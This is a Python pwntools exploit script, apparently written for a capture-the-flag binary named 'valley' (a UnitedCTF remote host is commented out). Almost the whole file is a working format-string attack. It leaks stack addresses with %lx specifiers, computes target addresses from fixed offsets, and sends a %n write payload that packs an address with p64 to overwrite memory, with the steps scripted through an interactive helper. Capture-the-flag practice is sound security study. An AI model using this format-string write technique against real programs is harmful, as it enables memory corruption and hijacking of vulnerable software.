from dataclasses import dataclass
import time

import pwnlib.tubes.process as process
import pwnlib.tubes.remote as remote
import pwnlib.util.packing as packing
import pwnlib.fmtstr as fmtstr
from pwnlib.context import context

from interactive_nc import InteractiveNC
context.bits = 64
# nc = "c.unitedctf.ca"
# port = 10033
# r = remote.remote(nc,port)
r = process.process(["/mnt/c/Users/massi/Downloads/valley"])

 #
def readline(endOfLine="\n"):
    data = b""
    rec = ""
    while rec != bytes(endOfLine, "utf-8"):
        rec = r.recvn(1)
        data += rec
    return data.decode()


def readlines(number_of_lines: int, endOfLine="\n"):
    lines = []
    for _ in range(number_of_lines):
        lines += readline(endOfLine)
    return "".join(lines)


def readall():
    rec = r.recvall()
    return rec.decode()


def sendline(toSend):
    r.send(f"{toSend}\n".encode())


def sendbytes(toSend: bytes):
    r.send(toSend)   
    

vars = {
    "f1":b"%21$lx",
    "f2":b"%20$lx",
    "f1_offset":"426",
    "f2_offset":"8",
    "payload":b"%95409997116009x%10$nAAAAAAA"
}
interactive = InteractiveNC(r,vars=vars,command_prefix="!")
interactive.add_input("!b")
interactive.add_input("!f1")
interactive.add_input("!i")
interactive.add_input("!s all f1_res")
interactive.add_input("!sl f1_res 27 39 f1_addr")
interactive.add_input("!10 f1_addr")
interactive.add_input("!- f1_addr f1_offset f1_addr")
interactive.add_input("!b")
interactive.add_input("!f2")
interactive.add_input("!i")
interactive.add_input("!s all f2_res")
interactive.add_input("!sl f2_res 27 39 f2_addr")
interactive.add_input("!10 f2_addr")
interactive.add_input("!- f2_addr f2_offset f2_addr")
interactive.add_input("!e b'%' + f2_addr + b'x%10$nAAAAAAA' + util.packing.p64(int(f1_addr))")
interactive.interactive()
